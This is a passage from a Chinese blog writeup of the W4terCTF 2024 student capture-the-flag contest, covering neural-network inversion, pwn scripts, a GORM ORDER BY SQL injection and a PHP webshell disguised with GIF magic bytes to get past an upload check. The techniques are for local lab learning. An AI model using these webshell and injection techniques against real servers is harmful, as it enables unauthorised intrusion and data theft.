

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=dark>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/algorithmpark.png">
  <link rel="icon" href="/img/algorithmpark.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="CJL, fuusen, unknown25001">
  <meta name="keywords" content="">
  
    <meta name="description" content="中山大学信息安全新手赛 W4terCTF 2024总结">
<meta property="og:type" content="article">
<meta property="og:title" content="W4terCTF2024 Writeup">
<meta property="og:url" content="https://blog.algorithmpark.xyz/2024/04/29/ctf/W4terCTF2024/index/index.html">
<meta property="og:site_name" content="AlgorithmPark">
<meta property="og:description" content="中山大学信息安全新手赛 W4terCTF 2024总结">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog.algorithmpark.xyz/img/W4terCTF2024.png">
<meta property="article:published_time" content="2024-04-29T22:47:56.000Z">
<meta property="article:modified_time" content="2024-04-29T14:54:36.015Z">
<meta property="article:author" content="CJL">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.algorithmpark.xyz/img/W4terCTF2024.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>W4terCTF2024 Writeup - AlgorithmPark</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/KaTeX/0.16.2/katex.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"blog.algorithmpark.xyz","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":100,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  



  
<meta name="generator" content="Hexo 7.0.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Algorithm Park</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/old/" target="_self">
                <i class="iconfont icon-plan"></i>
                <span>旧算法乐园</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/W4terCTF2024-banner.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="W4terCTF2024 Writeup"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-04-29 22:47" pubdate>
          2024年4月29日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          9.9k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          83 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">W4terCTF2024 Writeup</h1>
            
              <p id="updated-time" class="note note-info" style="display: none">
                
                  
                    本文最后更新于 2024-04-29T14:54:36+00:00
                  
                  

                
              </p>
            
            
              <div class="markdown-body">
                
                <h1>W4terCTF2024 Writeup</h1>
<p>中山大学信息安全新手赛 W4terCTF 2024总结</p>
<p>队伍成员：</p>
<p><img src="./W4terCTF2024.assets/68fe4e125cd3d31eb8a7141047ff7a6.jpg" srcset="/img/loading.gif" lazyload alt="队伍"></p>
<p>比赛情况：</p>
<p><img src="./W4terCTF2024.assets/W4terCTF2024-banner.png" srcset="/img/loading.gif" lazyload alt="W4terCTF2024-banner"></p>
<p>有幸获得全场前五</p>
<h2 id="AI">AI</h2>
<h3 id="Network-Reverse">Network Reverse</h3>
<p>网络结构长这样：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs lisp">Sequential(<br>  (<span class="hljs-number">0</span>): Conv2d(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, kernel_size=(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), stride=(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>))<br>  (<span class="hljs-number">1</span>): GELU(<span class="hljs-name">approximate=</span>&#x27;none&#x27;)<br>  (<span class="hljs-number">2</span>): Conv2d(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>, kernel_size=(<span class="hljs-number">5</span>, <span class="hljs-number">5</span>), stride=(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>))<br>  (<span class="hljs-number">3</span>): GELU(<span class="hljs-name">approximate=</span>&#x27;none&#x27;)<br>  (<span class="hljs-number">4</span>): MaxPool2d(<span class="hljs-name">kernel_size=3</span>, stride=3, padding=0, dilation=1, ceil_mode=False)<br>  (<span class="hljs-number">5</span>): Linear(<span class="hljs-name">in_features=412</span>, out_features=1848, bias=True)<br>  (<span class="hljs-number">6</span>): Conv2d(<span class="hljs-number">8</span>, <span class="hljs-number">1</span>, kernel_size=(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>), stride=(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>))<br>  (<span class="hljs-number">7</span>): Tanh()<br>)<br></code></pre></td></tr></table></figure>
<p>首先，卷积和池化层只会在图像中的一个较小的局部内用某种方式抹一把，并不会比如说把W的上半部分丢到另一个地方去，<strong>不会破坏可辨识的字体形状</strong>，所以卷积和池化层可以直接当做不存在。</p>
<p>第一层<code>atan()</code>没有难度，第三层给<code>weight</code>求个逆即可逆向：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse</span>(<span class="hljs-params">ts</span>):<br>    ts = torch.atanh(ts)<br>    C = ts<br>    A = net[<span class="hljs-number">5</span>].weight.transpose(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>)<br>    ts = C @ torch.pinverse(A)<br><br>    <span class="hljs-keyword">return</span> ts<br></code></pre></td></tr></table></figure>
<p>上面这个函数逆向出来长这样：</p>
<p><img src="./W4terCTF2024.assets/mUBcnEN2zCRShaO.png" srcset="/img/loading.gif" lazyload alt="network-reverse1"></p>
<p>感觉行之间的梯度非常小，不如来个竖直方向的锐化滤波器试试？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">mat = np.array(reverse(tensor).detach().numpy()[<span class="hljs-number">0</span>])<br>kernel = np.array([[<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>]], dtype=np.float32)<br>filtered = cv2.filter2D(mat, -<span class="hljs-number">1</span>, kernel)<br><br>plt.imshow(filtered, cmap=<span class="hljs-string">&#x27;gray&#x27;</span>)<br></code></pre></td></tr></table></figure>
<p><img src="./W4terCTF2024.assets/qiCOuyBTSU7KXw6.png" srcset="/img/loading.gif" lazyload alt="network-reverse2"></p>
<p>啊？</p>
<h2 id="Pwn">Pwn</h2>
<h3 id="Remember-It-0">Remember It 0</h3>
<p>签到题，自动化脚本获取flag：</p>
<figure class="highlight python"><figcaption><span>ipynb</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">50184</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>, drop=<span class="hljs-literal">False</span>)<br>    p.send(<span class="hljs-string">&quot;1\n&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>, drop=<span class="hljs-literal">False</span>)<br>    x = p.recvuntil(<span class="hljs-string">&quot;\x08&quot;</span>, drop=<span class="hljs-literal">False</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;plz input your answer\n&quot;</span>, drop=<span class="hljs-literal">False</span>)<br>    x = x[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>) + <span class="hljs-string">&#x27;\n&#x27;</span><br>    p.send(x)<br>p.send(<span class="hljs-string">&quot;cat flag\n&quot;</span>)<br>flag = p.recvuntil(<span class="hljs-string">&quot;&#125;&quot;</span>, drop=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
<p><code>W4terCTF&#123;THOU9h_l_Hav3_tO_SAy_g0oD8y3~&#125;</code></p>
<h3 id="Remember-It-1">Remember It 1</h3>
<p>无保护，可以栈溢出。</p>
<p><img src="./W4terCTF2024.assets/qcsDAJHgp5bZNeR.png" srcset="/img/loading.gif" lazyload alt="Remember-It-1-1"></p>
<p><code>read</code>一次读32字节，缓冲区有10 * 32字节，按理来说只有十轮游戏就不会越界，然而并没有超过十轮退出游戏的逻辑，十轮之后可以接着下一轮，这时读到的东西就越过缓冲区了。</p>
<p>比较菜，没用明白<code>pwntools</code>，是手搓十六进制编辑器作为输入，开着gdb一点一点试出来的。payload如下：</p>
<p><img src="./W4terCTF2024.assets/nU18YoKDFALga5s.png" srcset="/img/loading.gif" lazyload alt="Remember-It-1-2"></p>
<p>前面是一堆<code>1\nAAAABBBB...\n</code>用来跳过前十轮，第十一轮读指针已经位于栈顶附近，把<code>FEE1DEAD</code>的地址<code>0xB61840</code>放在<code>$rbp</code>指向的位置，然后用垃圾填满32字节结束本次<code>read</code>，下一轮选4退出游戏，<code>main</code>返回，就会到达<code>FEE1DEAD</code>。</p>
<h3 id="2048">2048</h3>
<p>ISTG我真的只是随便敲了一坨输入进去，然后直接弹了句<code>sh: 1: xxxxxx: not found</code>给我整不会了。</p>
<p>下面是可以稳定getshell的payload：</p>
<p><img src="./W4terCTF2024.assets/e5u37tTcN1jqFOy.png" srcset="/img/loading.gif" lazyload alt="2048"></p>
<h2 id="Web">Web</h2>
<h3 id="GitZip">GitZip</h3>
<p>重新做了一遍：</p>
<p><img src="./W4terCTF2024.assets/cTfr4Qmi1jK5zeN.png" srcset="/img/loading.gif" lazyload alt="gitzip1"></p>
<p>漏洞大概是这里：</p>
<p><img src="./W4terCTF2024.assets/j5ZdYeMpEIBiL2a.png" srcset="/img/loading.gif" lazyload alt="gitzip2"></p>
<p>要把<code>.</code>和<code>/</code>都用<code>%</code>编码才能过，<code>/</code>也要编码是我没想到的，大概是针对每一层<code>/</code>的处理会包含一些奇怪的特殊步骤，需要把<code>/</code>编码掉来跳过这些步骤，让完整的路径字符串直达<code>req.params.htmlname</code>。</p>
<h3 id="ASHBP">ASHBP</h3>
<p>查看源代码，首先全局搜索 <code>flag</code> ，马上就找到可以直接得到 flag 的 <code>get_flag</code> 函数：</p>
<figure class="highlight php"><figcaption><span>download.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">rsa_decrypt</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>同时在 <code>init.sh</code> 中可以看到 flag 的位置：</p>
<figure class="highlight bash"><figcaption><span>init.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$GZCTF_FLAG</span> &gt; /tmp/flag<br><span class="hljs-built_in">chmod</span> 444 /tmp/flag<br><br><span class="hljs-built_in">unset</span> GZCTF_FLAG<br><br><span class="hljs-built_in">base64</span> /var/www/html/src/rsa.pem &gt; /var/www/html/src/rsa_base64.pem<br><span class="hljs-built_in">base64</span> /var/www/html/src/rsa_pub.pem &gt; /var/www/html/src/rsa_pub_base64.pem<br><br>php-fpm -D<br>nginx -g <span class="hljs-string">&#x27;daemon off;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>flag 位置为 <code>/tmp/flag</code> ；</p>
<p>全局搜索 <code>get_flag</code> 找到调用该函数的地方：</p>
<figure class="highlight php"><figcaption><span>admin.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">......<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;rsa.php&quot;</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;download.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cre&#x27;</span>])&#123;    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">rsa_decrypt</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cre&#x27;</span>])!=<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;凭据无效！&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">get_flag</span>();<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>查看 <code>rsa_decrypt</code> 解密的逻辑：</p>
<figure class="highlight php"><figcaption><span>rsa.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rsa_decrypt</span>(<span class="hljs-params"><span class="hljs-variable">$endata</span></span>)</span>&#123;<br>    <span class="hljs-comment">//私钥解密</span><br>    <span class="hljs-variable">$private_key</span> = <span class="hljs-title function_ invoke__">openssl_pkey_get_private</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(PRIVATE_PATH));<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$private_key</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;私钥不可用&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable">$return_de</span> = <span class="hljs-title function_ invoke__">openssl_private_decrypt</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$endata</span>), <span class="hljs-variable">$decrypted</span>, <span class="hljs-variable">$private_key</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$return_de</span>)&#123;<br>        <span class="hljs-keyword">return</span>(<span class="hljs-string">&#x27;解密失败,请检查RSA秘钥&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$decrypted</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>下载公钥 <code>rsa_pub.pem</code> ，RSA 加密后再 base64 加密 <code>admin</code> 和 <code>/tmp/flag</code> ，分别作为 <code>cre</code> 和 <code>flag</code> ， POST 获取 flag ：</p>
<figure class="highlight shell"><figcaption><span>hack.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">export cre=$(echo admin | openssl rsautl -encrypt -inkey rsa_pub.pem -pubin | base64)<br><br>export flag=$(echo flag | openssl rsautl -encrypt -inkey rsa_pub.pem -pubin | base64)<br><br>curl -X POST -F &quot;cre=$cre&quot; -F &quot;flag=$flag&quot; http://127.0.0.1:50741/admin.php<br></code></pre></td></tr></table></figure>
<p><code>W4terCTF&#123;Unl0ck_7he_sECreTs_O1_tHE_s1MPle_hOMEw0rk_SUbm1Ssion_PLATfoRM&#125;</code></p>
<h3 id="User-Manager">User Manager</h3>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go">r.GET(<span class="hljs-string">&quot;/users&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>    <span class="hljs-keyword">var</span> users []User<br>    orderBy := c.Query(<span class="hljs-string">&quot;order_by&quot;</span>)<br>    <span class="hljs-keyword">if</span> orderBy == <span class="hljs-string">&quot;&quot;</span> &#123;<br>        orderBy = <span class="hljs-string">&quot;id asc&quot;</span><br>    &#125;<br>    db.Order(orderBy).Find(&amp;users)<br><br>    <span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> users &#123;<br>        users[i].Secret = <span class="hljs-string">&quot;hidden www~~&quot;</span><br>    &#125;<br><br>    c.JSON(http.StatusOK, users)<br>&#125;)<br></code></pre></td></tr></table></figure>
<p>这里<code>orderBy</code>直接来自用户输入，而GORM文档写道：</p>
<p><img src="./W4terCTF2024.assets/RusG1mrbDpxjyTC.png" srcset="/img/loading.gif" lazyload alt="user-manager"></p>
<p><a target="_blank" rel="noopener" href="https://gorm.io/zh_CN/docs/security.html">安全 | GORM - The fantastic ORM library for Golang, aims to be developer friendly.</a></p>
<p>看起来<code>db.Order(string)</code>会把<code>string</code>直接拼在SQL语句的<code>ORDER BY</code>后面，于是加了个<code>;</code>，在后面注入了一句<code>UPDATE</code>，把所有用户的<code>name</code>改为自己的<code>secret</code>，下一次直接GET即可从用户的<code>name</code>字段拿到flag。</p>
<h3 id="PNG-Server">PNG Server</h3>
<p><code>php.ini</code> 中存在漏洞：</p>
<figure class="highlight php"><figcaption><span>php.ini</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cgi.fix_pathinfo = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>这个设置会导致所请求的 <code>.php</code> 文件不存在就会跳到上一层的路径查找文件，比如说 <code>http://....../.php</code> ，那么就可以确定我们需要上传一个 php 文件</p>
<p>源代码中用 <code>isImage</code> 来判断上传文件是否为图片，这里的检查非常随便，存在漏洞:</p>
<figure class="highlight php"><figcaption><span>index.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$imgPath</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$file</span>  = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$imgPath</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-variable">$bin</span>  = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>);<br><br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$strInfo</span> = <span class="hljs-title function_ invoke__">unpack</span>(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>);<br>    <span class="hljs-variable">$typeCode</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>] . <span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]);<br>    <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$typeCode</span> == <span class="hljs-number">255216</span> || <span class="hljs-variable">$typeCode</span> == <span class="hljs-number">7173</span> || <span class="hljs-variable">$typeCode</span> == <span class="hljs-number">13780</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$typeCode</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>只需要在 php 木马前加上 <code>GI</code> （ 2 个字节对应 <code>7173</code> ）就可以通过检查，写一个返回 flag  的 php 木马：</p>
<figure class="highlight shell"><figcaption><span>shell</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">GI&lt;?php<br><span class="hljs-meta prompt_">$</span><span class="language-bash">currentDirectory = <span class="hljs-built_in">realpath</span>(<span class="hljs-built_in">dirname</span>(__FILE__));</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">flag_path = <span class="hljs-built_in">realpath</span>(<span class="hljs-variable">$currentDirectory</span> . <span class="hljs-string">&#x27;/../../../../../flag&#x27;</span>);</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">flag = fopen(<span class="hljs-variable">$flag_path</span> , <span class="hljs-string">&#x27;r&#x27;</span>);</span><br>if ($flag) &#123;<br>    $content = fread($flag, filesize($flag_path));<br>    echo $content;<br>    fclose($flag);<br>&#125; else &#123;<br>    echo &quot;无法打开文件 $filename&quot;;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
<p>然后上传该文件，文件已经被改名为了 md5 随机码，F12 找到该文件的 url ：</p>
<p><img src="./W4terCTF2024.assets/LRhQcpyB2oZPMkq.png" srcset="/img/loading.gif" lazyload alt="LRhQcpyB2oZPMkq"></p>
<p>然后在该 url 后面加上 <code>/.php</code> 就可以执行该 php 木马：</p>
<p><img src="./W4terCTF2024.assets/t6FA2a8iX9OwGog.png" srcset="/img/loading.gif" lazyload alt="t6FA2a8iX9OwGog"></p>
<p><code>W4terCTF&#123;uPL04Ds_ar3_0UR_vlC3_RCE_WwwWWw&#125;</code></p>
<h3 id="Auto-Unserialize">Auto Unserialize</h3>
<p>首先在盲目找线索的阶段我是用 <code>GET</code> 方法得到 flag 的位置的：</p>
